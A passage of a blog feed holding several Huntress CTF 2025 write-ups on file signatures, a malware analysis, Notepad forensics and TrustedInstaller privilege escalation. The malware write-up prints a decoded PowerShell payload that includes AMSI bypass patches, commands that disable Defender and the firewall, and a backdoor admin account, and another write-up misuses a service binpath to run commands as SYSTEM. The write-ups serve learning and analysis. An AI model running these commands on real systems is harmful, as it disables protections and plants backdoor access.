</code></pre></div></div>]]></content><author><name>alphaz3r0</name></author><category term="writeup" /><category term="misc" /><summary type="html"><![CDATA[Challenge Description]]></summary></entry><entry><title type="html">Huntress CTF 2025 - Snooze</title><link href="http://localhost:4000/writeup/misc/Snooze" rel="alternate" type="text/html" title="Huntress CTF 2025 - Snooze" /><published>2025-11-01T00:00:00+01:00</published><updated>2025-11-01T00:00:00+01:00</updated><id>http://localhost:4000/writeup/misc/Snooze</id><content type="html" xml:base="http://localhost:4000/writeup/misc/Snooze"><![CDATA[<h2 id="challenge-description">Challenge Description</h2>

<blockquote>
  <p>Don’t bug me, I’m sleeping! Zzzz… zzz… zzzz….</p>

  <p>Uncover the flag from the file presented.</p>
</blockquote>

<h2 id="solution">Solution</h2>

<p>We are given one file named: <code class="language-plaintext highlighter-rouge">snooze</code></p>

<p>When I checked with the <code class="language-plaintext highlighter-rouge">file</code> command:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">file snooze
snooze: compress<span class="s1">'d data 16 bits</span></code></pre></figure>

<p>When we cat the file, it shows gibberish. So instead we need to use hexdump (or similar tools) to inspect file signatures.</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">hexdump snooze

0000000 9d1f 6690 84d8 b339 4c67 318c 6e30 c98c
0000010 a301 998c 3530 e072 61b8 4c23 850e 6834
0000020 918c 2621 8dc6 3088 9466 a3e9 0000
000002d</code></pre></figure>

<p>The first bytes are 9d1f. Searching for this file signature reveals:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>The file signature 1F 9D is the magic number for a compress file, often a tar.z archive compressed using the Lempel-Ziv-Welch algorithm.
</code></pre></div></div>

<p>Now we see what extension is missing. We rename it to have the proper extension:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">mv </span>snooze snooze.z</code></pre></figure>

<p>Searching online to see how to extract .z files:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>To unzip a .z file, you can use the command-line utility gunzip
</code></pre></div></div>

<p>Let’s try that:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">gunzip </span>snooze.z

file snooze
snooze: ASCII text</code></pre></figure>

<p>Great! Now it’s identified as ASCII text. Let’s see what’s inside:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">cat </span>snooze
flag<span class="o">{</span>c1c07c90efa59876a97c44c2b175903e<span class="o">}</span></code></pre></figure>

<p>Conclusion</p>

<p>This challenge looked pretty easy but it teaches an important topic about <code class="language-plaintext highlighter-rouge">file signatures</code> and how to identify file types by their magic bytes when the extension is missing or incorrect.</p>]]></content><author><name>alphaz3r0</name></author><category term="writeup" /><category term="misc" /><summary type="html"><![CDATA[Challenge Description]]></summary></entry><entry><title type="html">Huntress CTF 2025 - Spaghetti</title><link href="http://localhost:4000/writeup/malware/Spaghetti" rel="alternate" type="text/html" title="Huntress CTF 2025 - Spaghetti" /><published>2025-11-01T00:00:00+01:00</published><updated>2025-11-01T00:00:00+01:00</updated><id>http://localhost:4000/writeup/malware/Spaghetti</id><content type="html" xml:base="http://localhost:4000/writeup/malware/Spaghetti"><![CDATA[<h2 id="challenge-description">Challenge Description</h2>

<blockquote>
  <p>You know, I’ve been thinking… at the end of the day, spaghetti is really just strings of pasta!</p>

  <p>Anyway, we saw this weird file running on startup. Can you figure out what this is?</p>

  <p>I’m sure you’ll get more understanding of the questions below as you explore!</p>
</blockquote>

<hr />

<h2 id="thought-process">Thought process:</h2>

<p>We are given 2 files:</p>

<p><code class="language-plaintext highlighter-rouge">spaghetti</code> - spaghetti: Non-ISO extended-ASCII text, with CRLF line terminators
<code class="language-plaintext highlighter-rouge">AYGIW.tmp</code> -AYGIW.tmp: ASCII text, with very long lines (65536), with no line terminators</p>

<p>looking at <code class="language-plaintext highlighter-rouge">spaghetti</code> we find really obfuscated VBS Script.</p>

<p>When I saw this part of the script</p>

<pre><code class="language-vbs">	[byte[]]$WULC4 = HombaAmigo($MainFileSettings.replace('WT','00'))
</code></pre>

<p>I rememberd that the <code class="language-plaintext highlighter-rouge">AYGIW.tmp</code> had a lot of  “WT”’s in it</p>

<p>i ran a simple command in terminal to replace all instances of “WT” with “00”</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat </span>AYGIW.tmp | <span class="nb">tr</span> <span class="s1">'WT'</span> <span class="s1">'00'</span>
</code></pre></div></div>

<p>And it looks like hex. So I went to cyberchef and pasted it and put recipe “From Hex”</p>

<p>First line looked promising:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>MZ..........ÿÿ..¸.......@.........................................º..´    Í!¸.LÍ!This program cannot be run in DOS mode.
</code></pre></div></div>

<p>One google search later:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>The DOS MZ executable format is the executable file format used for . EXE files in DOS. **The file can be identified by the ASCII string "MZ" (hexadecimal: 4D 5A) at the beginning of the file** (the "magic number"). "MZ" are the initials of Mark Zbikowski, one of the leading developers of MS-DOS.
</code></pre></div></div>

<p>So we use a little trick with command line with tool <code class="language-plaintext highlighter-rouge">xxd</code></p>

<p>After running this command</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat </span>AYGIW.tmp | <span class="nb">tr</span> <span class="s1">'WT'</span> <span class="s1">'00'</span> | xxd <span class="nt">-r</span> <span class="nt">-p</span> <span class="o">&gt;</span> decoded

file decoded
decoded: PE32 executable <span class="k">for </span>MS Windows 5.01 <span class="o">(</span>GUI<span class="o">)</span>, Intel i386, 7 sections
</code></pre></div></div>

<p>Nice we got an executable. What is the first thing you do with every executable you get in a CTF challenge?</p>

<p>Thats right you run [[strings]]  and [[grep]] for flag.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>strings decoded | <span class="nb">grep </span>flag
flag<span class="o">{</span>39544d3b5374ebf7d39b8c260fc4afd8<span class="o">}</span>
</code></pre></div></div>

<p>We just got the 1st of three flags.</p>

<p>So lets continue analysing the <code class="language-plaintext highlighter-rouge">spaghetti</code> file</p>

<p>There are 2 big blobs of made with lots of <code class="language-plaintext highlighter-rouge">%</code> and <code class="language-plaintext highlighter-rouge">~</code> characters.</p>

<p>also we see this:</p>

<pre><code class="language-vbs">Replace('~','0').Replace('%','1')))
$TDefo | .('{x}{9}'.replace('9','0').replace('x','1')-f'lun','%%').replace('%%','I').replace('lun','EX')
</code></pre>

<p>so it just converts it to binary?</p>

<p>Thats right and so we can recreate that with a simple python script that just replaces ~ with 0 and % with 1 and the to turn that binary to ascii.</p>

<h2 id="solutionpython">Solution(Python)</h2>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">binary_to_ascii</span><span class="p">(</span><span class="n">binary_str</span><span class="p">):</span>
    <span class="n">decoded_text</span> <span class="o">=</span> <span class="s">''</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">binary_str</span><span class="p">),</span> <span class="mi">8</span><span class="p">):</span>
        <span class="n">byte</span> <span class="o">=</span> <span class="n">binary_str</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">8</span><span class="p">]</span>
        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">byte</span><span class="p">)</span> <span class="o">==</span> <span class="mi">8</span><span class="p">:</span>
            <span class="n">decoded_text</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">byte</span><span class="p">,</span> <span class="mi">2</span><span class="p">))</span>
    <span class="k">return</span> <span class="n">decoded_text</span>

<span class="c1"># Extract the encoded string for $MyOasis4
</span><span class="n">encoded_my_oasis4</span> <span class="o">=</span> <span class="s">"here is blob from $MyOasis4 = (FonatozQZ()"</span>
<span class="n">encoded_tdefo</span> <span class="o">=</span> <span class="s">"here is blob from $TDefo = (FonatozQZ()"</span>
<span class="n">binary_my_oasis4</span> <span class="o">=</span> <span class="n">encoded_my_oasis4</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="s">'~'</span><span class="p">,</span> <span class="s">'0'</span><span class="p">).</span><span class="n">replace</span><span class="p">(</span><span class="s">'%'</span><span class="p">,</span> <span class="s">'1'</span><span class="p">)</span>
<span class="n">binary_tdefo</span> <span class="o">=</span> <span class="n">encoded_tdefo</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="s">'~'</span><span class="p">,</span> <span class="s">'0'</span><span class="p">).</span><span class="n">replace</span><span class="p">(</span><span class="s">'%'</span><span class="p">,</span> <span class="s">'1'</span><span class="p">)</span>
<span class="n">decoded_text</span> <span class="o">=</span> <span class="n">binary_to_ascii</span><span class="p">(</span><span class="n">binary_my_oasis4</span><span class="p">)</span>
<span class="n">decoded_text</span> <span class="o">+=</span> <span class="n">binary_to_ascii</span><span class="p">(</span><span class="n">binary_tdefo</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">decoded_text</span><span class="p">)</span>

</code></pre></div></div>

<h3 id="output">Output</h3>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>start-sleep 23
# Disable Script Logging:
$settings = [Ref].Assembly.GetType("System.Management.Automation.Utils").GetField("cachedGroupPolicySettings","NonPublic,Static").GetValue($null);
$settings["HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"] = @{}
$settings["HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"].Add("EnableScriptBlockLogging", "0")

# Matt Graebers Reflection method:
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Forcing an error:
$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076)
[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiSession","NonPublic,Static").SetValue($null, $null);[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiContext","NonPublic,Static").SetValue($null, [IntPtr]$mem)


start-sleep 12
$Win32 = @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type $Win32

$LoadLibrary = [Win32]::LoadLibrary("am" + "si.dll")
$Address = [Win32]::GetProcAddress($LoadLibrary, "Amsi" + "Scan" + "Buffer")
$p = 0
[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)


start-sleep 7


$ZQCUW = @"
using System;
using System.Runtime.InteropServices;
public class ZQCUW {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type $ZQCUW

$BBWHVWQ = [ZQCUW]::LoadLibrary("$([SYstem.Net.wEBUtIlITy]::HTmldecoDE('&amp;#97;&amp;#109;&amp;#115;&amp;#105;&amp;#46;&amp;#100;&amp;#108;&amp;#108;'))")
$XPYMWR = [ZQCUW]::GetProcAddress($BBWHVWQ, "$([systeM.neT.webUtility]::HtMldECoDE('&amp;#65;&amp;#109;&amp;#115;&amp;#105;&amp;#83;&amp;#99;&amp;#97;&amp;#110;&amp;#66;&amp;#117;&amp;#102;&amp;#102;&amp;#101;&amp;#114;'))")
# $XPYMWR = [ZQCUW]::GetProcAddress($BBWHVWQ, "$([systeM.neT.webUtility]::HtMldECoDE('&amp;#102;&amp;#108;&amp;#97;&amp;#103;&amp;#123;&amp;#98;&amp;#51;&amp;#49;&amp;#51;&amp;#55;&amp;#57;&amp;#52;&amp;#100;&amp;#99;&amp;#101;&amp;#102;&amp;#51;&amp;#51;&amp;#53;&amp;#100;&amp;#97;&amp;#54;&amp;#50;&amp;#48;&amp;#54;&amp;#100;&amp;#53;&amp;#52;&amp;#97;&amp;#102;&amp;#56;&amp;#49;&amp;#98;&amp;#54;&amp;#50;&amp;#48;&amp;#51;&amp;#125;'))")
$p = 0
[ZQCUW]::VirtualProtect($XPYMWR, [uint32]5, 0x40, [ref]$p)
$TLML = "0xB8"
$PURX = "0x57"
$YNWL = "0x00"
$RTGX = "0x07"
$XVON = "0x80"
$WRUD = "0xC3"
$KTMJX = [Byte[]] ($TLML,$PURX,$YNWL,$RTGX,+$XVON,+$WRUD)
[System.Runtime.InteropServices.Marshal]::Copy($KTMJX, 0, $XPYMWR, 6)
--------------------------------------------------------------------------------
Decoded string (2681 chars):
Add-MpPreference -ExclusionExtension ".bat"
Add-MpPreference -ExclusionExtension ".ppam"
Add-MpPreference -ExclusionExtension ".xls"
Add-MpPreference -ExclusionExtension ".bat"
Add-MpPreference -ExclusionExtension ".exe"
Add-MpPreference -ExclusionExtension ".vbs"
Add-MpPreference -ExclusionExtension ".js"
Add-MpPreference -ExclusionPath  C:\
Add-MpPreference -ExclusionPath  D:\
Add-MpPreference -ExclusionPath  E:\
Add-MpPreference -ExclusionPath  C:\ProgramData\MEMEMAN\
# Add-MpPreference -ExclusionExtension "flag{60814731f508781b9a5f8636c817af9d}"
Add-MpPreference -ExclusionProcess explorer.exe
Add-MpPreference -ExclusionProcess kernel32.dll
Add-MpPreference -ExclusionProcess aspnet_compiler.exe
Add-MpPreference -ExclusionProcess cvtres.exe
Add-MpPreference -ExclusionProcess CasPol.exe
Add-MpPreference -ExclusionProcess csc.exe
Add-MpPreference -ExclusionProcess Msbuild.exe
Add-MpPreference -ExclusionProcess ilasm.exe
Add-MpPreference -ExclusionProcess InstallUtil.exe
Add-MpPreference -ExclusionProcess jsc.exe
Add-MpPreference -ExclusionProcess Calc.exe
Add-MpPreference -ExclusionProcess powershell.exe
Add-MpPreference -ExclusionProcess rundll32.exe
Add-MpPreference -ExclusionProcess mshta.exe
Add-MpPreference -ExclusionProcess cmd.exe
Add-MpPreference -ExclusionProcess DefenderisasuckingAntivirus
Add-MpPreference -ExclusionProcess wscript.exe
Add-MpPreference -ExclusionIpAddress 127.0.0.1
Add-MpPreference -ThreatIDDefaultAction_Actions 6
Add-MpPreference -AttackSurfaceReductionRules_Ids 0
Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend
Set-MpPreference -EnableControlledFolderAccess Disabled
Set-MpPreference -PUAProtection disable
Set-MpPreference -HighThreatDefaultAction 6 -Force
Set-MpPreference -ModerateThreatDefaultAction 6
Set-MpPreference -LowThreatDefaultAction 6
Set-MpPreference -SevereThreatDefaultAction 6
Set-MpPreference -ScanScheduleDay 8
New-Ipublicroperty -Path HKLM:Software\Microsoft\Windows\CurrentVersion\policies\system -Name EnableLUA -PropertyType DWord -Value 0 -Force
Stop-Service -Name WinDefend -Confirm:$false -Force
Set-Service -Name WinDefend -StartupType Disabled
net user System32 /add
net user System32 123
net localgroup administrators System32 /add
net localgroup "Remote Desktop Users" System32 /add
net stop WinDefend
net stop WdNisSvc
sc delete windefend
netsh advfirewall set allprofiles state off
</code></pre></div></div>

<p>Look there it is another easy flag: <code class="language-plaintext highlighter-rouge">flag{60814731f508781b9a5f8636c817af9d}</code></p>

<p>One more to go.</p>

<p>While looking at this output one thing caught my eye:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$BBWHVWQ = [ZQCUW]::LoadLibrary("$([SYstem.Net.wEBUtIlITy]::HTmldecoDE('&amp;#97;&amp;#109;&amp;#115;&amp;#105;&amp;#46;&amp;#100;&amp;#108;&amp;#108;'))")
$XPYMWR = [ZQCUW]::GetProcAddress($BBWHVWQ, "$([systeM.neT.webUtility]::HtMldECoDE('&amp;#65;&amp;#109;&amp;#115;&amp;#105;&amp;#83;&amp;#99;&amp;#97;&amp;#110;&amp;#66;&amp;#117;&amp;#102;&amp;#102;&amp;#101;&amp;#114;'))")
# $XPYMWR = [ZQCUW]::GetProcAddress($BBWHVWQ, "$([systeM.neT.webUtility]::HtMldECoDE('&amp;#102;&amp;#108;&amp;#97;&amp;#103;&amp;#123;&amp;#98;&amp;#51;&amp;#49;&amp;#51;&amp;#55;&amp;#57;&amp;#52;&amp;#100;&amp;#99;&amp;#101;&amp;#102;&amp;#51;&amp;#51;&amp;#53;&amp;#100;&amp;#97;&amp;#54;&amp;#50;&amp;#48;&amp;#54;&amp;#100;&amp;#53;&amp;#52;&amp;#97;&amp;#102;&amp;#56;&amp;#49;&amp;#98;&amp;#54;&amp;#50;&amp;#48;&amp;#51;&amp;#125;'))")
</code></pre></div></div>

<p>Html decode? Searching we see:</p>

<p>“HTML decoding is  the process of converting special character sequences, called HTML entities, back into their original, human-readable characters”</p>

<p>And there are many decoders online lets use one and only CyberChef</p>

<p>Inputing these:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&amp;#97;&amp;#109;&amp;#115;&amp;#105;&amp;#46;&amp;#100;&amp;#108;&amp;#108;
&amp;#65;&amp;#109;&amp;#115;&amp;#105;&amp;#83;&amp;#99;&amp;#97;&amp;#110;&amp;#66;&amp;#117;&amp;#102;&amp;#102;&amp;#101;&amp;#114;
&amp;#102;&amp;#108;&amp;#97;&amp;#103;&amp;#123;&amp;#98;&amp;#51;&amp;#49;&amp;#51;&amp;#55;&amp;#57;&amp;#52;&amp;#100;&amp;#99;&amp;#101;&amp;#102;&amp;#51;&amp;#51;&amp;#53;&amp;#100;&amp;#97;&amp;#54;&amp;#50;&amp;#48;&amp;#54;&amp;#100;&amp;#53;&amp;#52;&amp;#97;&amp;#102;&amp;#56;&amp;#49;&amp;#98;&amp;#54;&amp;#50;&amp;#48;&amp;#51;&amp;#125;
</code></pre></div></div>

<p>And choosing From HTML Entity Recipe we get:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>amsi.dll
AmsiScanBuffer
flag{b313794dcef335da6206d54af81b6203}
</code></pre></div></div>

<p>And here is the 3rd and final flag.</p>]]></content><author><name>alphaz3r0</name></author><category term="writeup" /><category term="malware" /><summary type="html"><![CDATA[Challenge Description]]></summary></entry><entry><title type="html">Huntress CTF 2025 - Tabby’s Date</title><link href="http://localhost:4000/writeup/forensics/Tabby's-Date" rel="alternate" type="text/html" title="Huntress CTF 2025 - Tabby’s Date" /><published>2025-11-01T00:00:00+01:00</published><updated>2025-11-01T00:00:00+01:00</updated><id>http://localhost:4000/writeup/forensics/Tabby&apos;s-Date</id><content type="html" xml:base="http://localhost:4000/writeup/forensics/Tabby&apos;s-Date"><![CDATA[<h2 id="challenge-description">Challenge Description</h2>

<blockquote>
  <p>Ohhhh, Tab, Tab, Tab…. what has she done.</p>

  <p>My friend Tabby just got a new laptop and she’s been using it to take notes. She says she puts her whole life on there!</p>

  <p>She was so excited to finally have a date with a boy she liked, but she completely forgot the details of where and when. She told me she remembers writing it in a note… but she doesn’t think she saved it!!</p>

  <p>She shared with us an export of her laptop files.</p>
</blockquote>

<hr />

<h2 id="thought-process">Thought process</h2>

<p>I went to google and searched: “Recover not saved Notepad files”</p>

<p>I saw this</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>To recover an unsaved Notepad file, navigate to the hidden `%AppData%` folder in File Explorer by typing `%AppData%` into the search bar, and look for `.txt` files there or in `C:\\Users\\%USERNAME%\\AppData\\Local\\Notepad`. If you are using an application that offers a "Recover Unsaved Documents" feature, look for that option in the "File" menu.
</code></pre></div></div>

<p>Navigating</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pwd
/Documents/tabbys/C/Users/Tabby/AppData/Local/Packages/Microsoft.WindowsNotepad_8wekyb3d8bbwe/LocalState/TabState

ls
002d2531-9aff-42b1-b54d-b178c88063b4.bin  9e96bd4b-4155-4558-b97a-edcdf01d4584.bin
04165ca3-c82b-42ca-ab07-0c774ae66efd.bin  a16d5079-b2f7-4a54-b3d5-b32256c4f238.bin
056941ef-d51d-4e57-9a55-b59d58bf3fcb.bin  a2048a5f-5cb5-460d-8ce6-70899de24d9c.bin
14623d59-ad8c-43a8-b669-587f049a1516.bin  a9da0602-fcd2-4793-9bab-70276e881006.bin
17de440f-3f69-4d8a-94fe-f3d4b9cf0c3f.bin  af1fbc46-41cb-4d4b-9c34-02b874bfe9c6.bin
1aebb59c-5d51-41f1-918e-dec9e1a28ce1.bin  b5074fe7-4f54-4728-afe9-1c063d211a82.bin
2d755c27-5840-47ad-a4ca-ed8041dd3047.bin  b5154796-9d23-43ce-8a6c-c373e63f22c0.bin
2e0dd6b6-ba93-4efc-9fd4-985dad74869a.bin  bcd5d203-1523-4b86-a572-c1c3afded478.bin
414e4071-60e6-4bb6-9a5a-f1e5bf6fe79c.bin  c3cbe154-ef26-4e93-9183-c7fd323fe8c0.bin
45dcdbe4-26b5-4e0b-ba2d-29e9e9c1e11b.bin  c4b77218-ef21-4a7f-9814-e4444f82475a.bin
4f1c96a1-960c-4cee-9751-fe4b4f59fdd0.bin  cb2f0c84-6293-4e63-8575-78dc879945e0.bin
5a57ac85-7e99-4bfc-9e13-f0d28a2bcc20.bin  cd01dd8e-32f6-4f88-b9bb-4009afca3fea.bin
66f955a8-6994-47c6-8326-0f128dafd0b9.bin  dcfa4d00-41c8-439a-b1bd-2706dd8dbe0d.bin
68d7e607-77c4-4d35-8ef2-0170a84efe5f.bin  dea21c9d-4534-4d38-a60b-0a5c1b9b5928.bin
68fefe2f-a7a6-4afa-b383-7fdc142aadde.bin  e21dc9ae-2a03-42bf-8972-35ce8d524695.bin
711f26f1-0eff-4a34-a78c-03562e44a36b.bin  e6a849ab-6f02-452c-98e7-cdb03c577818.bin
7458196e-e979-4d94-982a-246fca3db028.bin  e86c9910-afca-4e83-87f6-600ed08a0570.bin
7ba066a2-e0cb-4c06-9339-316411a3da27.bin  ed9b5775-f35a-4770-a35e-e3c24b8bed47.bin
9925cc8a-6440-4128-acae-f31541130a5e.bin  f1473e57-7637-4bd0-8158-53715ea20630.bin
9bf7ca49-e491-4691-a21a-f3263bb695a2.bin
</code></pre></div></div>

<p>Wrote a simple script to hexdump it:</p>

<h2 id="solutionbash">Solution(Bash)</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>

<span class="c"># Loop through all .bin files in the current directory</span>
<span class="k">for </span>file <span class="k">in</span> <span class="k">*</span>.bin<span class="p">;</span> <span class="k">do</span>
    <span class="c"># Check if there are any .bin files</span>
    <span class="o">[</span> <span class="nt">-e</span> <span class="s2">"</span><span class="nv">$file</span><span class="s2">"</span> <span class="o">]</span> <span class="o">||</span> <span class="o">{</span> <span class="nb">echo</span> <span class="s2">"No .bin files found."</span><span class="p">;</span> <span class="nb">exit </span>1<span class="p">;</span> <span class="o">}</span>

    <span class="nb">echo</span> <span class="s2">"Processing </span><span class="nv">$file</span><span class="s2">..."</span>

    <span class="c"># Create a new file with .txt extension containing the hex dump</span>
    xxd <span class="s2">"</span><span class="nv">$file</span><span class="s2">"</span> <span class="o">&gt;</span> <span class="s2">"</span><span class="k">${</span><span class="nv">file</span><span class="p">%.bin</span><span class="k">}</span><span class="s2">.txt"</span>

    <span class="nb">echo</span> <span class="s2">"Saved hexdump to </span><span class="k">${</span><span class="nv">file</span><span class="p">%.bin</span><span class="k">}</span><span class="s2">.txt"</span>
<span class="k">done

</span><span class="nb">echo</span> <span class="s2">"Done!"</span>
</code></pre></div></div>

<p>After I ‘cat’ all the files I notice between every two characters is a dot.
So i grep for f.l.a.g and remove dots like this:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat</span> <span class="k">*</span>.txt | <span class="nb">grep </span>f.l.a.g <span class="nt">-A5</span> | <span class="nb">tr</span> <span class="nt">-d</span> <span class="s1">'.'</span>
00000290: 3a00 2000 6600 6c00 6100 6700 7b00 3100  : flag<span class="o">{</span>1
000002a0: 3600 3500 6400 3100 3900 6200 3600 3100  65d19b61
000002b0: 3000 6300 3000 3200 6200 3200 3800 3300  0c02b283
000002c0: 6600 6300 3100 6100 3600 6200 3400 6100  fc1a6b4a
000002d0: 3500 3400 6300 3400 6100 3500 3800 7d00  54c4a58<span class="o">}</span>
000002e0: 0d00 0d00 6800 6500 1920 7300 2000 7300  he s s

</code></pre></div></div>]]></content><author><name>alphaz3r0</name></author><category term="writeup" /><category term="forensics" /><summary type="html"><![CDATA[Challenge Description]]></summary></entry><entry><title type="html">Huntress CTF 2025 - Trust Me</title><link href="http://localhost:4000/writeup/misc/Trust-Me" rel="alternate" type="text/html" title="Huntress CTF 2025 - Trust Me" /><published>2025-11-01T00:00:00+01:00</published><updated>2025-11-01T00:00:00+01:00</updated><id>http://localhost:4000/writeup/misc/Trust-Me</id><content type="html" xml:base="http://localhost:4000/writeup/misc/Trust-Me"><![CDATA[<h2 id="challenge-description">Challenge Description</h2>

<blockquote>
  <p><em>C’mon bro, trust me! Just trust me!! Trust me bro!!!</em></p>

  <p>The <strong><code class="language-plaintext highlighter-rouge">TrustMe.exe</code></strong> program on this Windows desktop <em>“doesn’t trust me?”</em></p>

  <p>It says it will give me the flag, but only if I “have the permissions of <strong>Trusted Installer</strong>“…?</p>
</blockquote>

<hr />

<h2 id="thought-process">Thought process:</h2>

<p>We are give a RDP connection and there is a file <code class="language-plaintext highlighter-rouge">TrustMe.exe</code></p>

<p>When we try to execute it we get this:</p>

<p><img src="../../images/access_denied.png" alt="" /></p>

<p>After searching for Trusted Installer, ctf and writeup</p>

<p>I came accross this video from John Hammond:
https://www.youtube.com/watch?v=Vj1uh89v-Sc</p>

<p>But in that video he was able to just execute commands in cmd, so i transfer this file from rdp to my host machine and started static analysis.</p>

<p>always make backup copy of the file you are working with to not mess with its integrity:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cp TrustMe.exe TrustMe.exe.orig.exe
cp TrustMe.exe TrustMe.exe.patched.exe
</code></pre></div></div>

<p>While doing static analysis i came across mentions of <code class="language-plaintext highlighter-rouge">C:\ctf\key.bin</code></p>

<p>And then I remembered the video of John, the file is also “owned” by TrustedInstaller so we can use what we learned in that video to read it as  TrustedInstaller.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sc.exe config TrustedInstaller binpath= '"C:\Windows\System32\cmd.exe" /c type "C:\ctf\key.bin" &gt; "C:\Users\Public\key.bin"'
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>started the service 

&gt; sc.exe start TrustedInstaller
</code></pre></div></div>

<p>And inspected the bytes:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># prints hex bytes
Get-Content -Path C:\Users\Public\key.bin -Encoding Byte -ReadCount 0 |
  ForEach-Object { ($_ | ForEach-Object { "{0:X2}" -f $_ }) -join " " }
</code></pre></div></div>

<p>And we get this:
<code class="language-plaintext highlighter-rouge">C5C93BDB841534FAE5545EDCB0F12041D10CD4D90EE16A7D8235FA657C93825D</code></p>

<p>AES key? That sounds important!</p>

<p>But this was probably rabbit hole because there were 2 bytes missing from the encrypted string that is at the start of the file that i belive is encrypted flag <code class="language-plaintext highlighter-rouge">Wx6eETGXddnmCT4qZ7BxgRYpC+kdjjFzXxW+BM4HiI3GPaslpFBnpk9XplnaSxNg</code></p>

<p>Because after Decrypting the string with the key we get this
<code class="language-plaintext highlighter-rouge">95d526595e62cf1f4d82a}</code></p>

<p>After solving the challenge i checked and in fact it was the right flag just missing some characters for now I am not sure why.</p>

<p>So now we are at the starting line again</p>

<hr />

<p>After going through disassembly code I found this:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0x140001468 cmp dword [IsMember], r14d 
0x14000146d 75 31 jne 0x1400014a0
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">0x75 0x31</code> is <code class="language-plaintext highlighter-rouge">jne +0x31</code>. We could changed <code class="language-plaintext highlighter-rouge">0x75</code> → <code class="language-plaintext highlighter-rouge">0xEB</code> (opcode for <code class="language-plaintext highlighter-rouge">jmp short</code>) leaving the relative offset <code class="language-plaintext highlighter-rouge">0x31</code> unchanged. The two‑byte instruction length is preserved.</p>

<p><strong>Byte-level change</strong>:</p>

<ul>
  <li>VA: <code class="language-plaintext highlighter-rouge">0x14000146d</code></li>
  <li>Original bytes: <code class="language-plaintext highlighter-rouge">75 31</code></li>
  <li>Patched bytes: <code class="language-plaintext highlighter-rouge">EB 31</code></li>
</ul>

<p>This will turns <code class="language-plaintext highlighter-rouge">jne 0x1400014a0</code> into <code class="language-plaintext highlighter-rouge">jmp 0x1400014a0</code> (i.e., unconditional branch to success block).</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>r2 -w -c 's 0x14000146d; px 2; wx eb; px 2; wq' TrustMe.exe.patched.exe
